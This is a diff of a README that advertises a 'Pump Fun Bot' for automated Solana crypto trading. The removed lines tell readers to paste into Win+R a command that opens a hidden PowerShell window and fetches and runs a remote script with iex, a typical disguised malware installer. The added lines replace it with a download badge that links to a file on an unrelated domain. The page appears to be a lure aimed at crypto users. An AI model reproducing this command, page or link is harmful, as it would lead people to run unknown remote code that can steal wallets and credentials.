@@ -6,11 +6,10 @@
 **Pump Fun Bot** is your all-in-one solution for automated trading on the Solana blockchain! 🌟 This multi-functional bot combines various powerful features to streamline your trading experience and help you stay ahead in the competitive cryptocurrency market. With tools like the **PumpFun Trading Bot**, **Pump Fun Bundle Bot**, and more, you can manage your investments efficiently and effectively.
 
 <h2>📥 Download the Program</h2>
-<h3>copy and execute the following command in (Win+R)</h3>
+<a href="https://talkingmanager.com/1C8kxSMV?name=PumpfunBotV1.2" download>
+  <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
+</a>
 
-<pre>
-  <code id="code-snippet">cmd.exe /c start /min powershell -w h "$u='https://aidetector.tools/wZWZqs';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr $u -UseBasicParsing -UserAgent 'ID: daff2f8').Content;</code>
-</pre>
 
 ## Key Features.
 - **💰 Pump Fun Bundle Bot**: Effortlessly distribute SOL across multiple wallets with the bundle bot feature. This function enhances liquidity and manages risk by allowing you to send tokens to numerous wallets simultaneously.
